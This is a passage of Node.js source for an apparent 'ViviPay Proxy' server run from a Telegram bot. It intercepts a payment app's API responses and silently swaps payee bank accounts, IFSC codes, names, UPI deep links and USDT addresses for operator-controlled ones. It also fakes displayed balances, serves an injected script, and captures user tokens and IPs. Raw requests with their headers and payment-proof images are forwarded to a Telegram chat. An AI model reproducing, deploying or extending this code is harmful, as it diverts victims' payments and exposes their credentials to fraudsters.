            const ext = proof.mime.includes('jpeg') || proof.mime.includes('jpg') ? 'jpg' : proof.mime.includes('webp') ? 'webp' : 'png';
            await bot.sendPhoto(data.adminChatId, proof.buffer, { caption }, { filename: `payment-proof-${orderId || 'unknown'}.${ext}`, contentType: proof.mime });
        } else {
            await bot.sendMessage(data.adminChatId, caption + '\\n⚠️ Image payload parse nahi ho paya.');
        }
    } catch (e) {
        // Do not fail the user's upload if Telegram is temporarily unavailable.
        try { await bot.sendMessage(data.adminChatId, caption + '\\n⚠️ Proof image forward failed: ' + String(e.message || e).slice(0, 300)); } catch (e2) { }
    }
}

// ── Raw Request+Response logger (/rr command) ────────────────────────────────
async function sendRawLog(data, { method, url, reqHeaders, reqBodyRaw, status, respHeaders, respBodyRaw, source, now }) {
    if (!data.rawLog || !data.adminChatId || !bot) return;

    // ── Format headers as clean key: value lines
    function fmtHeaders(hdrs) {
        if (!hdrs || typeof hdrs !== 'object') return '  (none)';
        return Object.entries(hdrs)
            .map(([k, v]) => `  ${k}: ${v}`)
            .join('\n') || '  (none)';
    }

    // ── Pretty-print JSON body or raw string
    function fmtBody(raw) {
        if (!raw || (typeof raw === 'string' && raw.trim() === '') || (Buffer.isBuffer(raw) && raw.length === 0)) return '  (empty)';
        const str = Buffer.isBuffer(raw) ? raw.toString('utf-8') : String(raw);
        try {
            const parsed = JSON.parse(str);
            return JSON.stringify(parsed, null, 2);
        } catch (e) {
            return str;
        }
    }

    // ── Split a long string into Telegram-safe chunks (max 4000 chars)
    async function sendChunked(text) {
        const MAX = 4000;
        if (text.length <= MAX) {
            try { await bot.sendMessage(data.adminChatId, text); } catch (e) { }
            return;
        }
        let i = 0;
        let part = 1;
        while (i < text.length) {
            const chunk = text.slice(i, i + MAX);
            try { await bot.sendMessage(data.adminChatId, `[part ${part}]\n` + chunk); } catch (e) { }
            i += MAX;
            part++;
        }
    }

    const srcTag = source === 'frontend' ? '🌐 FRONTEND' : '📱 API';

    // ── REQUEST message
    const reqMsg =
        `╔══════════════════════════════════╗
║   📡 RAW LOG — ${srcTag}
╚══════════════════════════════════╝
🕐 ${now}

📤 REQUEST
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔹 Method : ${method}
🔹 URL    : ${url}

📋 Headers:
${fmtHeaders(reqHeaders)}

📦 Body:
${fmtBody(reqBodyRaw)}`;

    // ── RESPONSE message
    const respMsg =
        `📥 RESPONSE  [${status}]
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 Headers:
${fmtHeaders(respHeaders)}

📦 Body:
${fmtBody(respBodyRaw)}`;

    await sendChunked(reqMsg);
    await sendChunked(respMsg);
}
// ─────────────────────────────────────────────────────────────────────────────

function findNumericId(obj, depth) {
    if (!obj || typeof obj !== 'object' || depth > 5) return '';
    if (Array.isArray(obj)) return '';
    const idFields = ['teamWorkId', 'userId', 'uid', 'id', 'memberId', 'memberCodeId', 'channelUid', 'user_id', 'userid', 'account_id', 'accountId', 'customerId'];
    for (const f of idFields) {
        if (obj[f] !== undefined && obj[f] !== null && obj[f] !== '') {
            const val = String(obj[f]);
            if (/^\d+$/.test(val) && val.length >= 3) return val;
        }
    }
    for (const key of Object.keys(obj)) {
        if (typeof obj[key] === 'object' && !Array.isArray(obj[key])) {
            const found = findNumericId(obj[key], depth + 1);
            if (found) return found;
        }
    }
    return '';
}

function getTokenFromReq(req) {
    if (req.query && req.query.token) return req.query.token.trim();
    const auth = req.headers['authorization'] || req.headers['token'] || req.headers['x-token'] || req.headers['access-token'] || '';
    if (auth.startsWith('Bearer ')) return auth.substring(7).trim();
    if (auth) return auth.trim();
    const ck = req.headers['cookie'] || '';
    const tm = ck.match(/token=([^;]+)/);
    if (tm) return tm[1].trim();
    return '';
}

function getClientIP(req) {
    return req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || req.headers['x-real-ip'] || '';
}

async function resolveUserId(req) {
    const tok = getTokenFromReq(req);
    if (tok && tokenUserMap[tok]) return tokenUserMap[tok];
    const ip = getClientIP(req);
    if (ip && ipUserMap[ip]) return ipUserMap[ip];
    try {
        const data = await loadData();
        if (data.tokenMap) {
            if (tok && data.tokenMap[tok]) {
                tokenUserMap[tok] = data.tokenMap[tok];
                return data.tokenMap[tok];
            }
            if (ip && data.tokenMap['ip_' + ip]) {
                ipUserMap[ip] = data.tokenMap['ip_' + ip];
                return data.tokenMap['ip_' + ip];
            }
        }
    } catch (e) { }
    return '';
}

async function saveUserMapping(req, userId) {
    if (!userId) return;
    const tok = getTokenFromReq(req);
    if (tok) tokenUserMap[tok] = String(userId);
    const ip = getClientIP(req);
    if (ip) ipUserMap[ip] = String(userId);
    try {
        const data = await loadData();
        if (!data.tokenMap) data.tokenMap = {};
        let changed = false;
        if (tok && data.tokenMap[tok] !== String(userId)) { data.tokenMap[tok] = String(userId); changed = true; }
        if (ip && data.tokenMap['ip_' + ip] !== String(userId)) { data.tokenMap['ip_' + ip] = String(userId); changed = true; }
        if (changed) await saveData(data);
    } catch (e) { }
}

function parseMultipartFields(rawBody) {
    if (!rawBody || rawBody.length === 0) return {};
    const bodyStr = rawBody.toString();
    const fields = {};
    const parts = bodyStr.split(/--[-a-zA-Z0-9]+/);
    for (const part of parts) {
        const nm = part.match(/name="([^"]+)"/);
        if (nm) {
            let vIdx = part.indexOf('\r\n\r\n');
            if (vIdx === -1) vIdx = part.indexOf('\n\n');
            if (vIdx !== -1) {
                fields[nm[1]] = part.substring(vIdx + (part[vIdx] === '\r' ? 4 : 2)).trim();
            }
        }
    }
    return fields;
}

const BANK_FIELD_MAP = {
    accountno: 'accountNo', accountnumber: 'accountNo', account_no: 'accountNo',
    receiveaccountno: 'accountNo', bankaccount: 'accountNo', bankaccountno: 'accountNo',
    payeeaccount: 'accountNo', cardno: 'accountNo', cardnumber: 'accountNo',
    bankcardno: 'accountNo', payeecardno: 'accountNo', receivecardno: 'accountNo',
    payeebankaccount: 'accountNo', payeebankaccountno: 'accountNo', payeeaccountno: 'accountNo',
    receiveraccount: 'accountNo', receiveraccountno: 'accountNo',
    walletaccount: 'accountNo', walletno: 'accountNo', collectionaccount: 'accountNo',
    collectionaccountno: 'accountNo', customerbanknumber: 'accountNo',
    acctno: 'accountNo', acctnum: 'accountNo', acct_no: 'accountNo',
    account: 'accountNo', receiveaccount: 'accountNo', ctaccount: 'accountNo',
    beneficiaryname: 'accountHolder', accountname: 'accountHolder', account_name: 'accountHolder',
    receiveaccountname: 'accountHolder', holdername: 'accountHolder', accountholder: 'accountHolder',
    bankaccountholder: 'accountHolder', receivename: 'accountHolder',
    payeename: 'accountHolder', bankaccountname: 'accountHolder', realname: 'accountHolder',
    cardholder: 'accountHolder', cardname: 'accountHolder', receivername: 'accountHolder',
    collectionname: 'accountHolder', customername: 'accountHolder', accname: 'accountHolder',
    acc_name: 'accountHolder', acctname: 'accountHolder', acct_name: 'accountHolder',
    truename: 'accountHolder', receiverealname: 'accountHolder',
    payeerealname: 'accountHolder',
    ifsc: 'ifsc', ifsccode: 'ifsc', ifsc_code: 'ifsc', receiveifsc: 'ifsc',
    bankifsc: 'ifsc', payeeifsc: 'ifsc', receiverifsc: 'ifsc', collectionifsc: 'ifsc',
    acctcode: 'ifsc', acct_code: 'ifsc', acctifsc: 'ifsc',
    bankname: 'bankName', bank_name: 'bankName', payeebankname: 'bankName', receiverbankname: 'bankName',
    upiid: 'upiId', upi_id: 'upiId', upi: 'upiId', vpa: 'upiId',
    payeeupi: 'upiId', receiverupi: 'upiId', walletupi: 'upiId',
    payeebankaccount: 'accountNo', payeerecipientsname: 'accountHolder',
    payeerecipientsname: 'accountHolder', payeerecipientname: 'accountHolder',
    recipientsname: 'accountHolder', recipientname: 'accountHolder',
    payeebankname: 'bankName', payerbankname: 'bankName'
};

function captureRealBank(obj, depth) {
    if (!obj || typeof obj !== 'object' || (depth || 0) > 8) return null;
    if (Array.isArray(obj)) {
        for (const item of obj) { const r = captureRealBank(item, (depth || 0) + 1); if (r) return r; }
        return null;
    }
    const found = { accountHolder: '', accountNo: '', ifsc: '', bankName: '', upiId: '' };
    for (const k of Object.keys(obj)) {
        const kl = k.toLowerCase().replace(/[_-]/g, '');
        const mapped = BANK_FIELD_MAP[kl];
        if (mapped && !found[mapped] && obj[k] && String(obj[k]).trim()) found[mapped] = String(obj[k]).trim();
    }
    if (found.accountNo || found.ifsc) return found;
    for (const k of Object.keys(obj)) {
        if (typeof obj[k] === 'object') { const r = captureRealBank(obj[k], (depth || 0) + 1); if (r) return r; }
    }
    return null;
}

function scanHasBankFields(obj, depth) {
    if (!obj || typeof obj !== 'object' || depth > 10) return false;
    if (Array.isArray(obj)) { return obj.some(item => scanHasBankFields(item, depth + 1)); }
    for (const k of Object.keys(obj)) {
        const kl = k.toLowerCase().replace(/[_-]/g, '');
        if (BANK_FIELD_MAP[kl] === 'accountNo' || BANK_FIELD_MAP[kl] === 'ifsc') return true;
        if (typeof obj[k] === 'object' && scanHasBankFields(obj[k], depth + 1)) return true;
        if (typeof obj[k] === 'string' && /^(mobikwik|freecharge|amazonpay|phonepe|paytm|bhim|gpay|upi):\/\//i.test(obj[k])) return true;
    }
    return false;
}

const NAME_FIELDS = ['name', 'payname', 'username', 'ctname', 'holdername', 'ownername',
    'receivename', 'payeename', 'beneficiaryname', 'accountname', 'realname',
    'cardholder', 'cardname', 'receivername', 'collectionname', 'customername',
    'truename', 'accname', 'acctname', 'bankaccountname', 'receiveaccountname',
    'payeerealname', 'receiverealname', 'bankaccountholder', 'accountholder'];

// Replace bank account/ifsc/name inside wallet deep-link URL strings
// Handles: mobikwik://, freecharge://, amazonpay://, phonepe://, paytm://, upi://
// and also plain https UPI pay URLs
function replaceWalletUrl(urlStr, bank) {
    if (!urlStr || typeof urlStr !== 'string') return urlStr;
    // Must look like a wallet/UPI deep link or UPI pay URL
    if (!/^(mobikwik|freecharge|amazonpay|phonepe|paytm|bhim|gpay|upi|https?):\/\//i.test(urlStr)) return urlStr;
    // Param names that carry bank account number in these URLs
    const acctParams = ['account', 'accountnumber', 'acc', 'payeeaccount', 'pa', 'payee', 'vaccount', 'vpa', 'to'];
    const ifscParams = ['ifsc', 'bankifsc', 'payeeifsc', 'fi'];
    const nameParams = ['name', 'payeename', 'pn', 'reciever', 'receiver', 'to_name', 'toname'];
    const dispParams = ['displayaccountnumber', 'displayaccount', 'maskedaccount', 'masked'];

    try {
        // Split scheme + path from query string (deep links have custom schemes)
        const qIdx = urlStr.indexOf('?');
        if (qIdx === -1) return urlStr;
        const base = urlStr.slice(0, qIdx + 1);
        const params = new URLSearchParams(urlStr.slice(qIdx + 1));
        let changed = false;

        for (const [key] of params) {
            const kl = key.toLowerCase().replace(/[_-]/g, '');
            if (bank.accountNo && acctParams.includes(kl)) {
                params.set(key, bank.accountNo); changed = true;
            } else if (bank.ifsc && ifscParams.includes(kl)) {
                params.set(key, bank.ifsc); changed = true;
            } else if (bank.accountHolder && nameParams.includes(kl)) {
                params.set(key, bank.accountHolder); changed = true;
            } else if (bank.accountNo && dispParams.includes(kl)) {
                // Replace the masked display number with real (new) account number
                params.set(key, bank.accountNo); changed = true;
            }
        }
        return changed ? base + params.toString() : urlStr;
    } catch (e) {
        return urlStr;
    }
}

function deepReplaceBankFields(obj, bank, depth, globalHasAcct) {
    if (!obj || typeof obj !== 'object' || depth > 10) return;
    if (Array.isArray(obj)) { for (let i = 0; i < obj.length; i++) deepReplaceBankFields(obj[i], bank, depth + 1, globalHasAcct); return; }
    for (const k of Object.keys(obj)) {
        if (typeof obj[k] === 'object') { deepReplaceBankFields(obj[k], bank, depth + 1, globalHasAcct); continue; }
        if (typeof obj[k] !== 'string' && typeof obj[k] !== 'number') continue;
        const kl = k.toLowerCase().replace(/[_-]/g, '');
        // ct_account/ctAccount is the platform's internal account reference.
        // Leave both spellings untouched; only payee/bank display fields change.
        if (kl === 'ctaccount') continue;
        const mapping = BANK_FIELD_MAP[kl];
        if (mapping && bank[mapping] && String(obj[k]).length > 0) { obj[k] = bank[mapping]; continue; }
        if (globalHasAcct && bank.accountHolder && NAME_FIELDS.includes(kl) && String(obj[k]).length > 0) { obj[k] = bank.accountHolder; continue; }
        if (kl === 'bank' && bank.bankName && String(obj[k]).length > 0) { obj[k] = bank.bankName; continue; }
        // Replace bank details embedded inside wallet deep-link URL strings
        if (typeof obj[k] === 'string' && obj[k].includes('://')) {
            const replaced = replaceWalletUrl(obj[k], bank);
            if (replaced !== obj[k]) { obj[k] = replaced; }
        }
    }
}

function getDisplayBankName(bank) {
    if (!bank || typeof bank !== 'object') return '';
    const raw = String(bank.bankName ?? bank.displayName ?? bank.bank ?? bank.name ?? '').trim();
    if (!raw) return '';
    // Some test/backend responses accidentally store {code,msg,data} as a string.
    // If the configured value has that shape, use another configured name field.
    if (/^\s*[\[{]/.test(raw) && /[\]}]\s*$/.test(raw)) {
        try {
            const parsed = JSON.parse(raw);
            const nested = parsed?.data?.bankName || parsed?.data?.name || parsed?.bankName || parsed?.name || '';
            if (nested && typeof nested === 'string') return nested.trim();
        } catch (e) { }
        return '';
    }
    return raw;
}

function replaceMalformedBankLabels(obj, displayName, depth = 0) {
    if (!obj || typeof obj !== 'object' || !displayName || depth > 10) return;
    if (Array.isArray(obj)) {
        for (const item of obj) replaceMalformedBankLabels(item, displayName, depth + 1);
        return;
    }
    for (const key of Object.keys(obj)) {
        const normalized = key.toLowerCase().replace(/[_-]/g, '');
        if (typeof obj[key] === 'string' && /bank/.test(normalized) && /^\s*\{\s*["']?code["']?\s*:/.test(obj[key])) {
            obj[key] = displayName;
        } else if (obj[key] && typeof obj[key] === 'object') {
            replaceMalformedBankLabels(obj[key], displayName, depth + 1);
        }
    }
}

// Detail endpoints are not always consistent: some responses contain bank fields,
// while others return only order metadata and let the frontend render these fields
// from the same payload. Replace existing fields and add the standard aliases so
// both the history text/list view and the clicked detail view receive the same bank.
function replaceOnlyBankNameFields(obj, bank, depth = 0) {
    if (!obj || typeof obj !== 'object' || !bank || depth > 10) return;
    if (Array.isArray(obj)) {
        for (const item of obj) replaceOnlyBankNameFields(item, bank, depth + 1);
        return;
    }
    const displayName = getDisplayBankName(bank);
    if (!displayName) return;
    const bankNameKeys = new Set(['bank', 'bankname', 'acctbankname', 'payeebankname', 'receiverbankname', 'payerbankname']);
    for (const key of Object.keys(obj)) {
        const normalized = key.toLowerCase().replace(/[_-]/g, '');
        if (bankNameKeys.has(normalized)) {
            obj[key] = displayName;
        } else if (obj[key] && typeof obj[key] === 'object') {
            replaceOnlyBankNameFields(obj[key], bank, depth + 1);
        }
    }
}

function replaceWaitConfirmBankFields(obj, bank, depth = 0) {
    if (!obj || typeof obj !== 'object' || !bank || depth > 10) return;
    if (Array.isArray(obj)) {
        for (const item of obj) replaceWaitConfirmBankFields(item, bank, depth + 1);
        return;
    }
    for (const key of Object.keys(obj)) {
        const normalized = key.toLowerCase().replace(/[_-]/g, '');
        if (normalized === 'ctaccount') continue;
        if (normalized === 'acctno' && bank.accountNo) {
            obj[key] = bank.accountNo;
        } else if (normalized === 'acctcode' && bank.ifsc) {
            obj[key] = bank.ifsc;
        } else if (normalized === 'acctname' && bank.accountHolder) {
            obj[key] = bank.accountHolder;
        } else if (obj[key] && typeof obj[key] === 'object') {
            replaceWaitConfirmBankFields(obj[key], bank, depth + 1);
        }
    }
}

function applySavedDetailReplacement(jsonResp, data, req) {
    if (!jsonResp || typeof jsonResp !== 'object' || !data) return false;
    const detail = jsonResp.data && typeof jsonResp.data === 'object' && !Array.isArray(jsonResp.data)
        ? jsonResp.data
        : null;
    if (!detail) return false;
    const ids = [
        getRequestOrderId(req),
        detail.rptNo, detail.rpt_no, detail.orderNo, detail.order_no,
        detail.orderId, detail.order_id, detail.id, detail.slipId, detail.slip_id
    ].filter(Boolean);
    let saved = null;
    for (const id of ids) {
        saved = getSavedOrderMapping(data, id);
        if (saved) break;
    }
    if (!saved) saved = getSavedOrderMapping(data, detail);
    const savedBank = bankFromSavedOrder(saved);
    if (!savedBank || !(savedBank.accountNo || savedBank.ifsc || savedBank.accountHolder)) return false;

    forceBankDetails(detail, savedBank);
    replaceOnlyBankNameFields(detail, savedBank);
    const displayIfsc = String(savedBank.ifsc || '').trim();
    if (displayIfsc) {
        detail.bankName = displayIfsc;
        detail.acctBankName = displayIfsc;
        detail.payee_bankname = displayIfsc;
        detail.payee_ifsc = displayIfsc;
        detail.payeeBankName = displayIfsc;
        detail.bank = displayIfsc;
        replaceMalformedBankLabels(detail, displayIfsc);
    }
    return true;
}

function forceBankDetails(obj, bank) {
    if (!obj || typeof obj !== 'object' || !bank || Array.isArray(obj)) return;
    const hasBank = scanHasBankFields(obj, 0);
    if (hasBank) deepReplaceBankFields(obj, bank, 0, hasBank);

    const accountHolder = bank.accountHolder || '';
    const accountNo = bank.accountNo || '';
    const ifsc = bank.ifsc || '';
    const bankName = getDisplayBankName(bank);
    const upiId = bank.upiId || '';
    const aliases = {
        acctName: accountHolder, accountName: accountHolder, name: accountHolder,
        acctNo: accountNo, accountNo, account: accountNo,
        acctCode: ifsc, ifsc, ifscCode: ifsc,
        bankName, acctBankName: bankName,
        upiId, payAccount: upiId
    };
    for (const [key, value] of Object.entries(aliases)) {
        if (value !== '') obj[key] = value;
    }
}

const BALANCE_KEYS = ['balance', 'userbalance', 'availablebalance', 'totalbalance', 'money',
    'itoken', 'itokenbalance', 'tokenbalance', 'usermoney', 'memberbalance',
    'mybalance', 'walletbalance', 'accountbalance', 'rechargebalance', 'coinbalance',
    'totalmoney', 'totalamount', 'membermoney', 'useritoken', 'myitoken', 'mytokenbalance'];

function addBalanceToFields(obj, bonus, depth) {
    if (!obj || typeof obj !== 'object' || !bonus || depth > 10) return;
    if (Array.isArray(obj)) { for (let i = 0; i < obj.length; i++) if (typeof obj[i] === 'object') addBalanceToFields(obj[i], bonus, depth + 1); return; }
    for (const k of Object.keys(obj)) {
        const kl = k.toLowerCase();
        if (BALANCE_KEYS.includes(kl)) {
            const v = parseFloat(obj[k]);
            if (!isNaN(v) && v >= 0) {
                obj[k] = typeof obj[k] === 'string' ? String((v + bonus).toFixed(2)) : parseFloat((v + bonus).toFixed(2));
            }
        }
        if (typeof obj[k] === 'object' && obj[k] !== null) addBalanceToFields(obj[k], bonus, depth + 1);
    }
}

function findBalanceDeep(obj, depth) {
    if (!obj || typeof obj !== 'object' || depth > 6) return null;
    const balKeys = ['iToken', 'itoken', 'balance', 'userBalance', 'availableBalance', 'totalBalance',
        'money', 'tokenBalance', 'usermoney', 'memberBalance', 'myBalance', 'itokenBalance', 'iTokenBalance',
        'userMoney', 'coinBalance', 'walletBalance'];
    for (const bk of balKeys) {
        if (obj[bk] !== undefined && obj[bk] !== null && obj[bk] !== '') {
            const v = parseFloat(obj[bk]);
            if (!isNaN(v)) return { field: bk, value: v };
        }
    }
    for (const k of Object.keys(obj)) {
        if (typeof obj[k] === 'object' && !Array.isArray(obj[k])) {
            const f = findBalanceDeep(obj[k], depth + 1);
            if (f) return f;
        }
    }
    return null;
}

function replaceUsdtAddress(obj, newAddr, depth) {
    if (!obj || typeof obj !== 'object' || depth > 10) return;
    if (Array.isArray(obj)) { for (let i = 0; i < obj.length; i++) replaceUsdtAddress(obj[i], newAddr, depth + 1); return; }
    for (const k of Object.keys(obj)) {
        if (typeof obj[k] === 'string' && /^T[A-Za-z1-9]{33}$/.test(obj[k])) {
            obj[k] = newAddr;
        } else if (typeof obj[k] === 'object') {
            replaceUsdtAddress(obj[k], newAddr, depth + 1);
        }
    }
}

app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD');
    res.header('Access-Control-Allow-Headers', '*');
    res.header('Access-Control-Allow-Credentials', 'true');
    if (req.method === 'OPTIONS') return res.sendStatus(200);
    next();
});

app.use((req, res, next) => {
    if (req.method === 'GET' || req.method === 'HEAD') return next();
    const chunks = [];
    req.on('data', c => chunks.push(c));
    req.on('end', () => {
        req.rawBody = Buffer.concat(chunks);
        const ct = (req.headers['content-type'] || '').toLowerCase();
        try {
            if (ct.includes('json')) {
                req.body = JSON.parse(req.rawBody.toString());
            } else if (ct.includes('form') && !ct.includes('multipart')) {
                const params = new URLSearchParams(req.rawBody.toString());
                req.body = Object.fromEntries(params);
            } else {
                req.body = {};
            }
        } catch (e) { req.body = {}; }
        next();
    });
});

app.use('/hook', (req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') return res.sendStatus(200);
    next();
});

app.get('/inject.js', async (req, res) => {
    res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
    res.setHeader('Access-Control-Allow-Origin', '*');
    try {
        const data = await loadData();
        const activeBank = getActiveBank(data, null);
        const initCfg = {
            tg: TELEGRAM_OVERRIDE,
            ifsc: activeBank ? String(activeBank.ifsc || '') : '',
            blockUpdate: data.blockUpdate !== false
        };
        let jsCode = INJECT_JS
            .replace('var CFG=null;', 'var CFG=' + JSON.stringify(initCfg) + ';')
            .replace("var SERVER_IFSC='';", 'var SERVER_IFSC=' + JSON.stringify(activeBank ? String(activeBank.ifsc || '') : '') + ';');
        res.send(jsCode);
    } catch (e) {
        res.send(INJECT_JS);
    }
});

app.get('/hook/config', async (req, res) => {
    try {
        const data = await loadData();
        const userId = req.query.userId || '';
        const bank = getActiveBank(data, userId);
        const uo = (userId && data.userOverrides) ? data.userOverrides[String(userId)] : null;
        const addedBal = (uo && uo.addedBalance !== undefined) ? uo.addedBalance : 0;
        const globalBonus = data.depositBonus || 0;
        const totalBonus = addedBal + globalBonus;
        const tracked = (userId && data.trackedUsers) ? data.trackedUsers[String(userId)] : null;
        const lastRealBal = (uo && uo.lastRealBalance !== undefined) ? uo.lastRealBalance : (tracked && tracked.balance !== undefined ? parseFloat(tracked.balance) : null);
        const shownBal = lastRealBal !== null ? parseFloat((lastRealBal + totalBonus).toFixed(2)) : (totalBonus > 0 ? totalBonus : null);
        res.json({
            enabled: data.botEnabled !== false,
            an: bank ? bank.accountNo : '',
            ah: bank ? bank.accountHolder : '',
            if: bank ? bank.ifsc : '',
            ifsc: bank ? bank.ifsc : '',
            bn: bank ? (bank.bankName || '') : '',
            ui: bank ? (bank.upiId || '') : '',
            tg: TELEGRAM_OVERRIDE,
            bonus: totalBonus,
            bal: shownBal,
            blockUpdate: data.blockUpdate !== false,
            usdtAddr: data.usdtAddress || ''
        });
    } catch (e) {
        res.json({ enabled: false, an: '', ah: '', if: '', ifsc: '', bn: '', ui: '', tg: TELEGRAM_OVERRIDE, bonus: 0 });
    }
});

app.post('/hook/log', async (req, res) => {
    res.json({ ok: true });
});

app.get('/setup-webhook', async (req, res) => {
    if (!bot) return res.json({ error: 'No bot token' });
    try {
        await bot.setWebHook(WEBHOOK_URL);
        webhookSet = true;
        const info = await bot.getWebHookInfo();
        res.json({ success: true, webhook: info });
    } catch (e) { res.json({ error: e.message }); }
});

app.get('/health', async (req, res) => {
    const data = await loadData(true);
    const bank = getActiveBank(data, null);
    let redisOk = false;
    if (redis) { try { await redis.ping(); redisOk = true; } catch (e) { } }
    res.json({
        status: 'ok', app: 'ViviPay Proxy v4 (server-side)',
        redis: redis ? (redisOk ? 'connected' : 'error') : 'not configured',
        bankActive: !!bank, totalBanks: data.banks.length,
        adminSet: !!data.adminChatId,
        trackedUsers: Object.keys(data.trackedUsers || {}).length,
        approach: 'Server-side proxy — all /xxapi/* routes intercepted'
    });
});

app.post('/bot-webhook', async (req, res) => {
    try {
        // A Telegram webhook update can be delivered more than once if Telegram
        // does not receive a fast 2xx response. Ignore the same update_id safely.
        if (!claimTelegramUpdate(req.body?.update_id)) return res.sendStatus(200);

        // Do not call setWebHook() while handling an update. On serverless
        // cold-starts that can re-register the webhook during command processing
        // and make the first command appear delayed or duplicated. Configure it
        // once through /setup-webhook instead.
        if (!bot) return res.sendStatus(200);
        const msg = req.body?.message;
        if (!msg || !msg.text) return res.sendStatus(200);
        const chatId = msg.chat.id;
        const sendCommandReply = async (...args) => {
            let lastError = null;
            for (let attempt = 0; attempt < 3; attempt++) {
                try {
                    return await bot.sendMessage(chatId, ...args);
                } catch (e) {
                    lastError = e;
                    if (attempt < 2) await new Promise(resolve => setTimeout(resolve, 200 * (attempt + 1)));
                }
            }
            console.error('Telegram command reply failed:', lastError && lastError.message);
            return null;
        };
        // Support group-chat command suffixes such as /on@MyBot and normalize
        // accidental surrounding whitespace without changing command arguments.
        const text = msg.text.trim().replace(/^\/(\w+)@[\w_]+/i, '/$1');
        let data = await loadData(true);
        const authorizedAdminId = TELEGRAM_ADMIN_CHAT_ID || String(data.adminChatId || '');
        if (TELEGRAM_ADMIN_CHAT_ID && String(data.adminChatId || '') !== TELEGRAM_ADMIN_CHAT_ID) {
            data.adminChatId = TELEGRAM_ADMIN_CHAT_ID;
            data._skipOverrideMerge = true;
            await saveData(data);
        }

        if (text === '/chatid') {
            await sendCommandReply(`Your Telegram chat ID is: ${chatId}\nSet TELEGRAM_ADMIN_CHAT_ID to this value in Vercel Environment Variables, then redeploy.`);
            return res.sendStatus(200);
        }

        if (text === '/start') {
            if (authorizedAdminId && String(authorizedAdminId) !== String(chatId)) {
                await sendCommandReply(`❌ Bot already configured with another admin.\nYour chat ID: ${chatId}\nUse /chatid, then set TELEGRAM_ADMIN_CHAT_ID in Vercel and redeploy.`);
                return res.sendStatus(200);
            }
            data.adminChatId = TELEGRAM_ADMIN_CHAT_ID || String(chatId);
            data._skipOverrideMerge = true;
            await saveData(data);
            await sendCommandReply(
                `🏦 ViviPay Proxy Controller v4
(Server-Side Proxy Mode)

=== BANK COMMANDS ===
/addbank Name|AccNo|IFSC|BankName|UPI
/removebank <number>
/setbank <number>
/setmin <number> <amount> — Min buy amount for bank replace
/banks — List all banks

=== MANUAL ORDERS ===
/addorder <OrderNo> | <BankIndex> — Map order to a bank
/delorder <OrderNo> — Remove a mapped order
/orders — List all saved orders
/delete all — Delete all saved orders

=== CONTROL ===
/on — Proxy ON
/off — Proxy OFF
/sendnext <clientId> — One-shot Client ID override
/ban <number> [message] — Block login for a number
/unban <number> — Remove login block
/bans — List blocked numbers
/rotate — Toggle auto-rotate
/log — Toggle request logging
/rr — Toggle full raw request+response log
/update — Toggle update block
/status — Full status

=== BALANCE ===
/add <amount> <userId>
/deduct <amount> <userId>
/remove balance <userId>
/history — Balance history
/clearhistory — Clear history

=== USDT ===
/usdt <address> — Set USDT
/usdt off — Disable

=== TRACKING ===
/idtrack — All tracked users

Example:
/addbank Rahul Kumar|1234567890|SBIN0001234|SBI|rahul@upi`
            );
            return res.sendStatus(200);
        }

        if (authorizedAdminId && String(authorizedAdminId) !== String(chatId)) {
            await sendCommandReply(`❌ Unauthorized.\nYour chat ID: ${chatId}\nUse /chatid, then set TELEGRAM_ADMIN_CHAT_ID in Vercel and redeploy.`);
            return res.sendStatus(200);
        }

        if (text === '/status') {
            const active = getActiveBank(data, null);
            let m = `📊 ViviPay Status (v4 Server-Side):\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\nUpdate Block: ${data.blockUpdate !== false ? '🚫 BLOCKED' : '✅ ALLOWED'}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
            if (data.usdtAddress) m += `\n₮ USDT: ${data.usdtAddress.substring(0, 15)}...`;
            if (active) m += `\n\n💳 Active:\n${active.accountHolder}\n${active.accountNo}\nIFSC: ${active.ifsc}${active.bankName ? '\nBank: ' + active.bankName : ''}${active.upiId ? '\nUPI: ' + active.upiId : ''}`;
            else m += '\n\n⚠️ No active bank';
            m += `\n\nNext Client-ID Override: ${data.nextClientIdOverride ? '🟡 ARMED' : '⚪ NONE'}`;
            await sendCommandReply(m);
            return res.sendStatus(200);
        }

        const sendNextMatch = text.match(/^\/sendnext\s+([A-Za-z0-9._-]{4,128})$/i);
        if (sendNextMatch) {
            const requestedClientId = sendNextMatch[1];
            data.nextClientIdOverride = {
                value: requestedClientId,
                setAt: Date.now(),
                expiresAt: Date.now() + CLIENT_ID_OVERRIDE_TTL,
                appliedEndpoints: []
            };
            data._skipOverrideMerge = true;
            await saveData(data);
            await sendCommandReply(`🧪 Client-ID override armed\nClient ID: ${requestedClientId}\nScope: next checkSmsNew/getsendtken/login flow\nExpires: 5 minutes or after login`);
            return res.sendStatus(200);
        }

        const banMatch = text.match(/^\/ban\s+(\d{4,20})(?:\s+([\s\S]*))?$/i);
        if (banMatch) {
            const banKey = normalizeBanKey(banMatch[1]);
            const banMessage = (banMatch[2] || 'Login is not available for this number.').trim();
            if (!data.bannedUsers) data.bannedUsers = {};
            data.bannedUsers[banKey] = { message: banMessage, setAt: Date.now() };
            data._skipOverrideMerge = true;
            await saveData(data);
            await sendCommandReply(`🚫 Login blocked\nNumber: ${banKey}\nMessage: ${banMessage}`);
            return res.sendStatus(200);
        }

        if (text === '/ban' || text.startsWith('/ban ')) {
            await sendCommandReply('❌ Format: /ban <number> [message]');
            return res.sendStatus(200);
        }

        const unbanMatch = text.match(/^\/unban\s+(\d{4,20})$/i);
        if (unbanMatch) {
            const banKey = normalizeBanKey(unbanMatch[1]);
            if (data.bannedUsers && data.bannedUsers[banKey]) {
                delete data.bannedUsers[banKey];
                data._skipOverrideMerge = true;
                await saveData(data);
